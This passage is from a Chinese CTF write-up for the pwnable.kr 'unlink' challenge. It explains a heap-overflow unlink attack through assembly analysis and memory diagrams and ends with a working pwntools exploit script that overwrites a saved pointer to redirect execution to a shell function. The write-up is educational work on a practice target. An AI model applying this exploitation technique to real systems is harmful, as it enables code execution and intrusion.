data-lazy-src="https://i.loli.net/2019/09/29/y8r4QgXz3GUmIHc.png"></p><ul><li><p><code>retn</code></p><p>retn指令作用是栈顶字单元出栈，其赋值给EIP寄存器，只要能够修改ESP寄存器的内容修改为shellcode的地址就能执行shellcode。</p></li><li><p><code>lea esp,[ecx-4]</code></p><p>lea指令将存储器操作数mem的4位16进制偏移地址送到指定的寄存器。eg：SI=1000H，执行指令 LEA BX , [SI] 后，BX=1000H。也就是说esp的值来自[ecx-4]指向的值 。</p></li><li><p><code>leave</code></p><p>leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。</p></li><li><p><code>mov ecx,[ebp+var_4]</code>相当于<code>mov ecx,[ebp-4]</code></p><p>ecx等于[ebp-4]指向的值，也就是我们需要将[ebp-4]指向的值修改为shellcode+4</p></li></ul><p>还记得我们已经分析得到的条件：<strong>可以利用堆溢出和unlind创造出两个指针</strong>。（ebp的值在程序运行时值不变）</p><p>我们就将其中的一个任意指针修改为<code>*(ebp-4)</code>，将ebp-4的值覆写为shellcode+4。</p><p>那我们先找出shellcode 和 ebp的内存地址：</p><ul><li><p>IDA函数表中找到shellcode地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/09/29/RxZXovqD6PMCFjf.png"></p></li><li><p>程序会将chunk A的栈地址和堆地址，而栈地址是用ebp计算偏移得到的。IDA中查看chunk A栈地址的偏移算法：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/09/29/6iAwIYcbFXzE8Bf.png"></p><p>chunk A stack addr = ebp+var_14 = ebp - 0x14</p></li></ul><p>从这里就可以推算出ebp - 0x4 相对于的chunk A 栈地址的相对位置，进而推算出实际内存地址。</p><p>shellcode的地址，我们需要找一个地址放置。方便我们构建的任意地址指针读取到ebp-0x4中。那么，我们就一齐写入到chunk A 堆中。</p><hr><p>接下来就是看看构造指针的fd、bk需要填入什么数。unlink 的计算方程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B-&amp;gt;bk-&amp;gt;fd = B-&amp;gt;fd</span><br><span class="line">B-&amp;gt;fd-&amp;gt;bk = B-&amp;gt;bk</span><br><span class="line"></span><br><span class="line">*(<span class="number">0x1030</span>+<span class="number">0</span>) = <span class="number">0x1010</span><span class="comment">//0x1030（后一个chunk的fd）的值被覆盖为0x1010 </span></span><br><span class="line">*(<span class="number">0x1010</span>+<span class="number">4</span>) = <span class="number">0x1030</span><span class="comment">//0x1014（前一个chunk的bk）的值被覆盖为0x1010</span></span><br></pre></td></tr></table></figure><p>我们利用第一个指针进行写入，也就是：<code>*(bk+0)=fd</code>。换而言之就是<code>*(ebp-4)=shellcode-4</code>。</p><p>得出我们需要填入的是fd = chunk A堆地址+12；bk = chunk A栈地址 + 0x10</p><p>初始情况下的chunk A :</p><p>data A on heap:</p><p>———————————     &lt;=A</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=A-&gt;buf , A+0x8</p><p>|   put shellcode here     |</p><p>|    length of buf is 0x8   |</p><p>———————————     </p><p>| presizeB    |     sizeB    |    </p><p>———————————     &lt;=B , A+0x8+0x8+0x8</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=B-&gt;buf</p><p>|                                      |</p><p>———————————</p><p>好，我们现在构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &amp;#039;a&amp;#039;用作填充chunk A剩余空间到达chunk B堆顶；</span><br><span class="line">payload &#x3D; p32(shell_addr)+&amp;#039;a&amp;#039;*12+p32(heap_addr + 12)+p32(stack_addr + 0x10)</span><br></pre></td></tr></table></figure><p>溢出覆写之后的chunk A：</p><p>data A on heap:</p><p>———————————     &lt;=A</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=A-&gt;buf , A+0x8</p><p>|    shellcode (4 byte)     |</p><p>|   AAAA (4 byte junk)    |</p><p>———————————     </p><p>|   AAAA      |    AAAA     |    </p><p>———————————     &lt;=B , A+0x8+0x8+0x8</p><p>|A heap +12|A stack+0x10|    </p><p>———————————     &lt;=B-&gt;buf</p><p>|                                      |</p><p>———————————</p><p>接下来调用unlink及其后面指令的原理简单记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;unlink之后得到的两条方程</span><br><span class="line">*（（A stack+0x10）+ 0）&#x3D; A heap +12</span><br><span class="line">*（（A heap +12） + 4）&#x3D; A stack+0x10</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;指针一化简得到</span><br><span class="line">*(ebp-0x14+0x10+0)&#x3D;shellcode + 0x4</span><br><span class="line">&#x2F;&#x2F;ebp-0x4指向的值被覆写为shellcode + 0x4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ebp-0x4指向的值shellcode+4被传入ecx</span><br><span class="line">mov ecx,[ebp+var_4]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）</span><br><span class="line">lea esp,[ecx-4]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcode</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span><span class="comment">#IDA函数列表可查得</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与服务器建立ssh链接</span></span><br><span class="line">s =  ssh(host=&amp;<span class="comment">#039;pwnable.kr&amp;#039;,</span></span><br><span class="line">         port=<span class="number">2222</span>,</span><br><span class="line">         user=&amp;<span class="comment">#039;unlink&amp;#039;,</span></span><br><span class="line">         password=&amp;<span class="comment">#039;guest&amp;#039;</span></span><br><span class="line">        )</span><br><span class="line">p = s.process(&amp;quot;./unlink&amp;quot;) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment"># 获取 A 栈地址</span></span><br><span class="line">p.recvuntil(&amp;quot;here <span class="keyword">is</span> stack address leak: &amp;quot;)</span><br><span class="line">stack_addr = p.recv(<span class="number">10</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 获取 A 堆地址</span></span><br><span class="line">p.recvuntil(&amp;quot;here <span class="keyword">is</span> heap address leak: &amp;quot;)</span><br><span class="line">heap_addr = p.recv(<span class="number">9</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr)+&amp;<span class="comment">#039;a&amp;#039;*12+p32(heap_addr + 12)+p32(stack_addr +16)</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="blog.csdn.net/qq_33528164/article/details/77061932">全面剖析Pwnable.kr unlink</a></p><p><a href="blog.sina.com.cn/s/blog_d18fc6010102x4l4.html">pwnable.kr unlink</a></p><p><a href="jianshu.com/p/90c5e76cae2e">pwnable.kr之unlink</a></p><p><a href="https://www.cnblogs.com/liuyimin/articles/7381018.html">pwnable.kr unlink之write up</a></p><p><a href="https://www.cnblogs.com/p4nda/p/7172104.html">【pwnable.kr】 unlink</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwnable.kr </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
